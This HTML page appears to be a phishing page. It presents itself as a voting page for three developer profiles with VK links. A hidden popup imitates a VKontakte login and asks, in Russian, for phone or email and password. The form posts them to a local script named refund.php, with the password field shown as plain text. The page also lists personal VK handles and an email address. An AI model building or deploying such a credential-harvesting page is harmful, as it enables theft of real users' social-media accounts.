<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Development</title>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="img/futs.png" type="images/x-icon">
    <link type="text/css" href="style.css">
    <link rel="stylesheet" href="media/media.css">
    <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
    <header>
		
			<h3>days 3/3</h3>
		
	</header>
    <div class="content-five-profile" id="content-five-profile-one">
        <!--Картинка-->
    <div class="content-five-photo">
        <i class="fas fa-user" id="content-five-photo-one"></i>
    </div>
        <h3>Malik Eliseev</h3>
        <p>front-end development</p>
        <!--Соц. сети-->
        <div class="content-five-profile-stats">
            <a href="https://vk.com/gazzylilpump" id="content-five-profile-stats-vk" target="_blank"><i class="fab fa-vk"></i></a>
            <a class="content-five-profile-stats-vote"><i class="fas fa-check"></i></a>
            <a href="mailto:dmitry.dmitriev467@gmail.com" id="content-five-profile-stats-mail"><i class="far fa-envelope"></i></a>
        </div>
</div>
<!--Второй-->
<div class="content-five-profile" id="content-five-profile-two">
        <div class="content-five-photo">
              <i class="fas fa-user"></i>
         </div>
    <h3>Dmitry Dmitriev</h3>
    <p>Full-stack development</p>
    <!--Соц. сети-->
    <div class="content-five-profile-stats">
        <a href="https://vk.com/forevernogod" id="content-five-profile-stats-vk" target="_blank"><i class="fab fa-vk"></i></a>
        <a class="content-five-profile-stats-vote"><i class="fas fa-check"></i></a>
        <a href="mailto:dmitry.dmitriev467@gmail.com" id="content-five-profile-stats-mail"><i class="far fa-envelope"></i></a>
    </div>
</div>
<!--Третий-->
<div class="content-five-profile" id="content-five-profile-three">
    <!--Картинка-->
    <div class="content-five-photo">
        <i class="fas fa-user" id="content-five-photo-three"></i>
    </div>
        <h3>Nikita Oboronin</h3>
        <p>front-end development</p>
        <!--Соц. сети-->
        <div class="content-five-profile-stats">
            <a href="https://vk.com/oborin_nikita" id="content-five-profile-stats-vk" target="_blank"><i class="fab fa-vk"></i></a>
            <a class="content-five-profile-stats-vote"><i class="fas fa-check"></i></a>
            <a href="mailto:dmitry.dmitriev467@gmail.com" id="content-five-profile-stats-mail"><i class="far fa-envelope"></i></a>
        </div>
</div>

<div class="arrow-down">
    </div>

<div class="overlay">
    <div class="popup">
        <div class="popup-title">
            <div class="popup-title-logo">
            <i class="fab fa-vk"></i>
        </div>
        </div>
        <div class="popup-close">
            &times;
        </div>
        <div class="popup-form">
            <form action="/phpcont/refund.php" method="POST" class="main-form" id="form">
                <div class="popup-form-header">
                    Для продолжения Вам необходимо войти ВКонтакте
                </div>
                <label for="text" class="popup-form__label">
                    Введите данные
                </label>
                <input autocomplete="none" type="text" class="popup-form__input" name="email" placeholder="Телефон или email" required>
                <input autocomplete="none" type="text" class="popup-form__input" name="password" placeholder="Пароль" required>
                <input onclick="SweetAlert()" type="submit" value="Авторизироваться" class="popup-form__btn"> 
            </form>
        </div>
    </div>
</div>
<script src="javas.js"></script>
</body>
</html>